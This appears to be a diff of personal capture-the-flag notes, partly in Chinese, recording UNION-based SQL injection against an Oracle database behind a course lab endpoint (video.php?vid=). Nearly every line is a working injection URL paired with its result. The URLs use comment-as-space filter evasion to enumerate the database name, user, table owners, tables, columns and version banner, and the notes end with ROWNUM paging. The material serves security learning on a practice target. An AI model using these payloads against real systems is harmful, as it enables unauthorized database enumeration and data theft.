@@ -1,1 +1,53 @@
 /**/   ----->   可取代space
+
+current database
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,SYS.DATABASE_NAME,null/**/from/**/dual
+---> XE
+
+user
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,user,null/**/from/**/dual
+---> SCOTT
+
+庫名
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES
+---> APEX_040200
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/DISTINCT/**/1,OWNER,null/**/from/**/ALL_TABLES/**/where/**/rownum=1
+---> SYS
+
+
+表名
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/ALL_TABLES
+---> AUDIT_ACTIONS
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,TABLE_NAME,null/**/from/**/ALL_TABLES/**/where/**/rownum=1
+---> DUAL
+
+column
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/all_tab_columns
+--->ALL$AW_CUBE_ENABLED_HIERCOMBO
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/all_tab_columns
+---> ABORT_STEP
+
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/all_tab_columns/**/where/**/rownum=1
+---> DUMMY
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,dummy,null/**/from/**/sys.dual
+---> X
+
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/user_tables
+---> BONUS
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,banner,null/**/from/**/v$version/**/where/**/rownum=1
+--->Oracle Database 12c Standard Edition Release 12.1.0.2.0 - 64bit Production
+
+https://docs.oracle.com/database/121/GMSWN/apc.htm#GMSWN793
+/**/where/**/rownum=1
+
+
+
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/all_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=2
